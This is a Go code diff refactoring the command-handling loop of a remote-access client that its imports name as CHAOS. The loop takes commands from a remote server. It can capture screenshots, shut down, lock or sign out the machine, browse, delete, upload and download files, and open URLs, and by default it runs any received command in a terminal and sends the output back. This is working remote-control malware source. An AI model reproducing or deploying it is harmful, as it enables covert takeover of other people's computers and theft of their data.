@@ -10,8 +10,8 @@ import (
 	ws "github.com/tiagorlampert/CHAOS/client/app/infrastructure/websocket"
 	"github.com/tiagorlampert/CHAOS/client/app/services"
 	"github.com/tiagorlampert/CHAOS/client/app/utils/encode"
+	"log"
 	"net/http"
-	"strings"
 	"time"
 )
 
@@ -91,8 +91,8 @@ func (h *Handler) SendDeviceSpecs() error {
 	if err != nil {
 		return err
 	}
-	res, err := h.Gateway.NewRequest(http.MethodPost,
-		fmt.Sprint(h.Configuration.Server.Url, "device"), body)
+	url := fmt.Sprint(h.Configuration.Server.Url, "device")
+	res, err := h.Gateway.NewRequest(http.MethodPost, url, body)
 	if err != nil {
 		return err
 	}
@@ -121,6 +121,7 @@ func (h *Handler) Reconnect() {
 
 func (h *Handler) HandleCommand() {
 	for {
+		log.Println("for")
 		if !h.Connected {
 			h.Reconnect()
 			continue
@@ -133,27 +134,19 @@ func (h *Handler) HandleCommand() {
 			continue
 		}
 
-		var command entities.Payload
-		if err := json.Unmarshal(message, &command); err != nil {
-			continue
-		}
-		if len(strings.TrimSpace(command.Request)) == 0 {
+		var request entities.Command
+		if err := json.Unmarshal(message, &request); err != nil {
 			continue
 		}
 
 		var response []byte
-		var hasErr bool
+		var hasError bool
 
-		commandParts := strings.Split(command.Request, " ")
-
-		mainCommand := strings.ToLower(commandParts[0])
-		subCommand := strings.Join(commandParts[1:], " ")
-
-		switch mainCommand {
+		switch request.Command {
 		case "getos":
 			deviceSpecs, err := h.Services.Information.LoadDeviceSpecs()
 			if err != nil {
-				hasErr = true
+				hasError = true
 				response = encode.StringToByte(err.Error())
 				continue
 			}
@@ -162,7 +155,7 @@ func (h *Handler) HandleCommand() {
 		case "screenshot":
 			screenshot, err := h.Services.Screenshot.TakeScreenshot()
 			if err != nil {
-				hasErr = true
+				hasError = true
 				response = encode.StringToByte(err.Error())
 				break
 			}
@@ -170,84 +163,87 @@ func (h *Handler) HandleCommand() {
 			break
 		case "restart":
 			if err := h.Services.OS.Restart(); err != nil {
-				hasErr = true
+				hasError = true
 				response = encode.StringToByte(err.Error())
 			}
 			break
 		case "shutdown":
 			if err := h.Services.OS.Shutdown(); err != nil {
-				hasErr = true
+				hasError = true
 				response = encode.StringToByte(err.Error())
 			}
 			break
 		case "lock":
 			if err := h.Services.OS.Lock(); err != nil {
-				hasErr = true
+				hasError = true
 				response = encode.StringToByte(err.Error())
 			}
 			break
 		case "sign-out":
 			if err := h.Services.OS.SignOut(); err != nil {
-				hasErr = true
+				hasError = true
 				response = encode.StringToByte(err.Error())
 			}
 			break
 		case "explore":
-			fileExplorer, err := h.Services.Explorer.ExploreDirectory(subCommand)
+			fileExplorer, err := h.Services.Explorer.ExploreDirectory(request.Parameter)
 			if err != nil {
 				response = encode.StringToByte(err.Error())
-				hasErr = true
+				hasError = true
 				break
 			}
 			explorerBytes, _ := json.Marshal(fileExplorer)
 			response = explorerBytes
 			break
 		case "download":
-			filepath := strings.TrimSpace(strings.ReplaceAll(command.Request, "download", ""))
+			filepath := request.Parameter
 			res, err := h.Services.Upload.UploadFile(filepath)
 			if err != nil {
 				response = encode.StringToByte(err.Error())
-				hasErr = true
+				hasError = true
 				break
 			}
 			response = res
 			break
 		case "delete":
-			filepath := strings.TrimSpace(strings.ReplaceAll(command.Request, "delete", ""))
+			filepath := request.Parameter
 			err := h.Services.Delete.DeleteFile(filepath)
 			if err != nil {
 				response = encode.StringToByte(err.Error())
-				hasErr = true
+				hasError = true
 				break
 			}
 			break
 		case "upload":
-			filepath := strings.TrimSpace(strings.ReplaceAll(command.Request, "upload", ""))
+			filepath := request.Parameter
 			res, err := h.Services.Download.DownloadFile(filepath)
 			if err != nil {
 				response = encode.StringToByte(err.Error())
-				hasErr = true
+				hasError = true
 				break
 			}
 			response = res
 			break
 		case "open-url":
-			err := h.Services.URL.OpenURL(subCommand)
+			err := h.Services.URL.OpenURL(request.Parameter)
 			if err != nil {
 				response = encode.StringToByte(err.Error())
-				hasErr = true
+				hasError = true
 				break
 			}
 			break
 		default:
-			response = encode.StringToByte(
-				h.Services.Terminal.Run(command.Request, h.Configuration.Connection.ContextDeadline))
+			response, err = h.RunCommand(request.Command)
+			if err != nil {
+				hasError = true
+				response = encode.StringToByte(err.Error())
+			}
 		}
 
-		body, err := json.Marshal(entities.Payload{
+		body, err := json.Marshal(entities.Command{
 			ClientID: h.ClientID,
 			Response: response,
-			HasError: hasErr,
+			HasError: hasError,
 		})
 		if err != nil {
 			continue
@@ -258,4 +254,8 @@ func (h *Handler) HandleCommand() {
 			continue
 		}
 	}
+}
+
+func (h *Handler) RunCommand(command string) ([]byte, error) {
+	return h.Services.Terminal.Run(command)
 }
